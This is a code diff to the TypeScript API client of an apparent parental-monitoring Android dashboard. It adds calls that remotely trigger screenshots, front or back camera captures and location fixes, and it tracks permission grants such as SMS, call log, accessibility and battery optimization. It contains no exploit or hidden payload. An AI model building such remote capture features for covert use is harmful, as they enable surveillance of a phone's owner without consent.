@@ -6,14 +6,46 @@ export interface User {
   role: 'parent' | 'admin';
 }
 
+export interface PermissionStatus {
+  callLog?: boolean;
+  phoneState?: boolean;
+  sms?: boolean;
+  location?: boolean;
+  camera?: boolean;
+  notifications?: boolean;
+  accessibility?: boolean;
+  batteryOptimization?: boolean;
+  manufacturer?: string;
+  model?: string;
+  androidVersion?: string;
+  updatedAt?: string;
+}
+
 export interface Device {
   id: string;
   deviceName: string;
   androidId: string;
   apkVersion: string;
+  manufacturer?: string | null;
+  model?: string | null;
+  permissionStatus?: PermissionStatus | null;
   lastSeen: string | null;
   isActive: boolean;
   user?: { email: string };
+}
+
+export interface DeviceCommand {
+  id: string;
+  deviceId: string;
+  type: string;
+  status: 'pending' | 'completed' | 'failed';
+  resultUrl?: string | null;
+  resultLat?: number | null;
+  resultLng?: number | null;
+  resultAcc?: number | null;
+  errorMsg?: string | null;
+  createdAt: string;
+  completedAt?: string | null;
 }
 
 function getToken(): string | null {
@@ -53,6 +85,15 @@ export const api = {
   getDevices: () => request<Device[]>('/device'),
 
   getDevice: (id: string) => request<Device>(`/device/${id}`),
+
+  createCommand: (deviceId: string, type: 'screenshot' | 'camera_front' | 'camera_back' | 'location') =>
+    request<DeviceCommand>(`/device/${deviceId}/commands`, {
+      method: 'POST',
+      body: JSON.stringify({ type }),
+    }),
+
+  getCommand: (deviceId: string, commandId: string) =>
+    request<DeviceCommand>(`/device/${deviceId}/commands/${commandId}`),
 
   getCalls: (deviceId: string) => request<CallLog[]>(`/data/calls/${deviceId}`),
 
